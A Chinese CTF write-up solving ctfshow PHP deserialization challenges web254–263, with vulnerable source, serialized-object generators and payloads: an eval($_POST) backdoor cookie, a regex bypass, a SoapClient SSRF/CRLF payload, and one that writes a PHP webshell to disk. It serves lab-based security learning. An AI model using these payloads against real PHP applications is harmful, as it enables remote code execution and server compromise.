# ctfshow_deserialize


ctfshow反序列化专题

<!--more-->

PHP面向对象编程：

https://www.runoob.com/php./php-oop.html

## 总结：

[Lethe's Blog谈一谈PHP反序列化](http://home.ustc.edu.cn/~xjyuan/blog/2019/08/06/understanding-of-PHP-deserialization/)

反序列化中常见的魔术方法：

```php
__wakeup() //执行unserialize()时，先会调用这个函数
__sleep() //执行serialize()时，先会调用这个函数
__destruct() //对象被销毁时触发
__call() //在对象上下文中调用不可访问的方法时触发
__callStatic() //在静态上下文中调用不可访问的方法时触发
__get() //用于从不可访问的属性读取数据或者不存在这个键都会调用此方法
__set() //用于将数据写入不可访问的属性
__isset() //在不可访问的属性上调用isset()或empty()触发
__unset() //在不可访问的属性上使用unset()时触发
__toString() //把类当作字符串使用时触发
__invoke() //当尝试将对象调用为函数时触发

如果类中同时定义了 __unserialize() 和 __wakeup() 两个魔术方法，
则只有 __unserialize() 方法会生效，__wakeup() 方法会被忽略。
```





## 靶场题目：

### [web254]

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-02 17:44:47
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-02 19:29:02
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
highlight_file(__FILE__);
include('flag.php');

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;

    public function checkVip(){
        return $this->isVip;
    }
    public function login($u,$p){
        if($this->username===$u&&$this->password===$p){
            $this->isVip=true;
        }
        return $this->isVip;
    }
    public function vipOneKeyGetFlag(){
        if($this->isVip){
            global $flag;
            echo "your flag is ".$flag;
        }else{
            echo "no vip, no flag";
        }
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = new ctfShowUser();
    if($user->login($username,$password)){
        if($user->checkVip()){
            $user->vipOneKeyGetFlag();
        }
    }else{
        echo "no vip,no flag";
    }
}
```

GET传参

```
username=xxxxxx&password=xxxxxx
```

### [web255]

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-02 17:44:47
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-02 19:29:02
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
highlight_file(__FILE__);
include('flag.php');

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;

    public function checkVip(){
        return $this->isVip;
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function vipOneKeyGetFlag(){
        if($this->isVip){
            global $flag;
            echo "your flag is ".$flag;
        }else{
            echo "no vip, no flag";
        }
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = unserialize($_COOKIE['user']);    
    if($user->login($username,$password)){
        if($user->checkVip()){
            $user->vipOneKeyGetFlag();
        }
    }else{
        echo "no vip,no flag";
    }
}
```

生成序列化内容

```php
<?php
class ctfShowUser{
    public $isVip=True;    
}
$user = urlencode(serialize(new ctfShowUser()));
echo $user;

?>
```

GET传参username和password内容，Cookie传递url编码后`public $isVip=True;`并序列化的参数

![image-20230728163802216](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230728163802216.png)

### [web256]

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-02 17:44:47
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-02 19:29:02
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
highlight_file(__FILE__);
include('flag.php');

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;

    public function checkVip(){
        return $this->isVip;
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function vipOneKeyGetFlag(){
        if($this->isVip){
            global $flag;
            if($this->username!==$this->password){
                    echo "your flag is ".$flag;
              }
        }else{
            echo "no vip, no flag";
        }
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = unserialize($_COOKIE['user']);    
    if($user->login($username,$password)){
        if($user->checkVip()){
            $user->vipOneKeyGetFlag();
        }
    }else{
        echo "no vip,no flag";
    }
}
```

要求svip为true，同时username和password的值不同
思路同类似上题

### [web257]

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-02 17:44:47
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-02 20:33:07
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
highlight_file(__FILE__);

class ctfShowUser{
    private $username='xxxxxx';
    private $password='xxxxxx';
    private $isVip=false;
    private $class = 'info';

    public function __construct(){
        $this->class=new info();
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function __destruct(){
        $this->class->getInfo();
    }

}

class info{
    private $user='xxxxxx';
    public function getInfo(){
        return $this->user;
    }
}

class backDoor{
    private $code;
    public function getInfo(){
        eval($this->code);
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = unserialize($_COOKIE['user']);
    $user->login($username,$password);
}
```

> __destruct() 是PHP面向对象编程的另一个重要的魔法函数，该函数会在类的一个对象被删除时自动调用。 
>
> 我们可以在该函数中添加一些释放资源的操作，比如关闭文件、关闭数据库链接、清空一个结果集等。其实，__destruct() 在日常的编码中并不常见，因为它是非必须的，是类的可选组成部分。通常只是用来完成对象被删除时的清理动作而已。

**反序列化题目的宗旨：**不能修改类方法的代码，但可以控制类方法的属性，通过类方法的属性来执行我们需要的操作

username和password只需要存在即可

```php
<?php
	class ctfShowUser{
		private $username='xxxxxx';
		private $password='xxxxxx';
		private $isVip=false;
		private $class = 'info';

		public function __construct(){
			$this->class=new backDoor();
		}
		public function login($u,$p){
			return $this->username===$u&&$this->password===$p;
		}
		public function __destruct(){
			$this->class->getInfo();
		}

	}

	class info{
		private $user='xxxxxx';
		public function getInfo(){
			return $this->user;
		}
	}

	class backDoor{
		private $code='eval($_POST[Ki1ro]);';
		public function getInfo(){
			eval($this->code);
		}
	}

	echo urlencode(serialize(new ctfShowUser()));

?>
```

payload：

```
GET username=1&password=2
COOKIE user=O%3A11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A21%3A%22%00ctfShowUser%00username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A21%3A%22%00ctfShowUser%00password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A18%3A%22%00ctfShowUser%00isVip%22%3Bb%3A0%3Bs%3A18%3A%22%00ctfShowUser%00class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A20%3A%22eval%28%24_POST%5BKi1ro%5D%29%3B%22%3B%7D%7D
```

### [web258]

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-02 17:44:47
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-02 21:38:56
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
highlight_file(__FILE__);

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;
    public $class = 'info';

    public function __construct(){
        $this->class=new info();
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function __destruct(){
        $this->class->getInfo();
    }

}

class info{
    public $user='xxxxxx';
    public function getInfo(){
        return $this->user;
    }
}

class backDoor{
    public $code;
    public function getInfo(){
        eval($this->code);
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    if(!preg_match('/[oc]:\d+:/i', $_COOKIE['user'])){
        $user = unserialize($_COOKIE['user']);
    }
    $user->login($username,$password);
}
```

对形如`O:8`进行了过滤，我们可以在数字前加上加号绕过 

执行一下php代码，并通过cookie传参

```php
<?php
class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=true;
    public $class = 'backDoor';

    public function __construct(){
        $this->class=new backDoor();
    }

    public function __destruct(){
        $this->class->getInfo();
    }

}

class backDoor{
    public $code="system('cat flag.php');";
    public function getInfo(){
        eval($this->code);
    }
}


$a = new ctfShowUser();
$a = serialize($a);
$a= str_replace('O:', 'O:+',$a);//绕过preg_match
echo urlencode($a);
```

username和password随意

![image-20230806151558519](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230806151558519.png)

### [web259]

![image-20230806153545668](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230806153545668.png)

```
<?php

highlight_file(__FILE__);


$vip = unserialize($_GET['vip']);
//vip can get flag one key
$vip->getFlag();



Notice: Undefined index: vip in /var/www/html/index.php on line 6

Fatal error: Uncaught Error: Call to a member function getFlag() on bool in /var/www/html/index.php:8 Stack trace: #0 {main} thrown in /var/www/html/index.php on line 8
```

这个类中有个__call魔术方法（当调用不存在的方法时触发），会调用SoapClient类的构造方法。

php的原生类SoapClient https://www.php.net/manual/en/class.soapclient.php

php执行：

```
<?php
$target = 'http://127.0.0.1/flag.php';
$post_string = 'token=ctfshow';
$b = new SoapClient(null,array('location' => $target,'user_agent'=>'wupco^^X-Forwarded-For:127.0.0.1,127.0.0.1^^Content-Type: application/x-www-form-urlencoded'.'^^Content-Length: '.(string)strlen($post_string).'^^^^'.$post_string,'uri'=> "ssrf"));
$a = serialize($b);
$a = str_replace('^^',"\r\n",$a);
echo urlencode($a);
?>
```

### [web260]

本题考点比较单一，传入含有不间断`ctfshow_i_love_36D`就可以

### [web261]

```php
<?php
 
highlight_file(__FILE__);
 
class ctfshowvip{
    public $username;
    public $password;
    public $code;
 
    public function __construct($u,$p){
        $this->username=$u;
        $this->password=$p;
    }
    public function __wakeup(){
        if($this->username!='' || $this->password!=''){
            die('error');
        }
    }
    public function __invoke(){
        eval($this->code);
    }
 
    public function __sleep(){
        $this->username='';
        $this->password='';
    }
    public function __unserialize($data){
        $this->username=$data['username'];
        $this->password=$data['password'];
        $this->code = $this->username.$this->password;
    }
    public function __destruct(){
        if($this->code==0x36d){
            file_put_contents($this->username, $this->password);
        }
    }
}
 
unserialize($_GET['vip']); 
```

这里面全是魔术方法

`__invoke()`当尝试将对象调用为函数时触发,但是这里没有相关的函数，所以这个相当于没用

`__destruct()``$this->code==0x36d`是弱类型比较，0x36d没有引号代表数字，十六进制0x36d转为十进制是877,我们只要让a=877.php，b为一句话木马即可

```php
<?php
 
class ctfshowvip{
    public $username;
    public $password;
    public function __construct(){
        $this->username='877.php';
        $this->password="<?php eval(system('tac /fl*')); ?>";
    }
}
 
echo urlencode(serialize(new ctfshowvip()));
```

### [web262]

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-03 02:37:19
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-03 16:05:38
# @message.php
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


error_reporting(0);
class message{
    public $from;
    public $msg;
    public $to;
    public $token='user';
    public function __construct($f,$m,$t){
        $this->from = $f;
        $this->msg = $m;
        $this->to = $t;
    }
}

$f = $_GET['f'];
$m = $_GET['m'];
$t = $_GET['t'];

if(isset($f) && isset($m) && isset($t)){
    $msg = new message($f,$m,$t);
    $umsg = str_replace('fuck', 'loveU', serialize($msg));
    setcookie('msg',base64_encode($umsg));
    echo 'Your message has been sent';
}

highlight_file(__FILE__);
```

非预期解：访问message.php，得到：

```php
<?php
highlight_file(__FILE__);
include('flag.php');
 
class message{
    public $from;
    public $msg;
    public $to;
    public $token='user';
    public function __construct($f,$m,$t){
        $this->from = $f;
        $this->msg = $m;
        $this->to = $t;
    }
}
 
if(isset($_COOKIE['msg'])){
    $msg = unserialize(base64_decode($_COOKIE['msg']));
    if($msg->token=='admin'){
        echo $flag;
    }
}
```

发送一个值为msg的cookie，并且token=admin

payload：

```php
<?php
 
class message{
    public $token='admin';
}
$a = serialize(new message());
echo base64_encode($a)
 
?>
```

![image-20230822160215709](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230822160215709.png)

### [web263]

session反序列化

![image-20231008182122264](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231008182122264.png)


